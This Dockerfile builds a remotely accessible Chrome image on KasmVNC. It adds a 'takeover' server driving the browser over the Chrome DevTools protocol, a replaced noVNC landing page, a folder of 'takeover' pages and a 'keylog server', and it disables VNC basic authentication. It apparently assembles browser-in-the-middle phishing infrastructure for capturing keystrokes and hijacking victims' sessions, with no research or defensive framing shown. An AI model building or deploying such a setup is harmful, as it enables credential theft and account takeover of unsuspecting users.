FROM kasmweb/chrome:1.17.0

USER root

# Installer Node 20 proprement
RUN apt-get update && apt-get install -y curl ca-certificates \
    && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y nodejs \
    && rm -rf /var/lib/apt/lists/*

# Takeover server
COPY takeover.js /usr/local/bin/takeover.js
RUN chmod +x /usr/local/bin/takeover.js
WORKDIR /usr/local/bin
RUN npm install chrome-remote-interface express

# Page noVNC custom
COPY index.html /usr/share/kasmvnc/www/index.html

# Pages for takeover
COPY pages /usr/local/share/takeover-pages

# Keylog server
COPY keylog_server.js /usr/local/bin/keylog_server.js
RUN chmod +x /usr/local/bin/keylog_server.js

# Startup wrapper
COPY startup-wrapper.sh /usr/local/bin/startup-wrapper.sh
RUN chmod +x /usr/local/bin/startup-wrapper.sh

# Disable basic auth
RUN sed -i 's/\bvncserver\b/vncserver -disableBasicAuth/' /dockerstartup/vnc_startup.sh

# Permissions
RUN chown -R kasm-user:kasm-user /usr/share/kasmvnc/www

EXPOSE 6901 5901 3000

USER 1000

ENTRYPOINT ["/usr/local/bin/startup-wrapper.sh"]
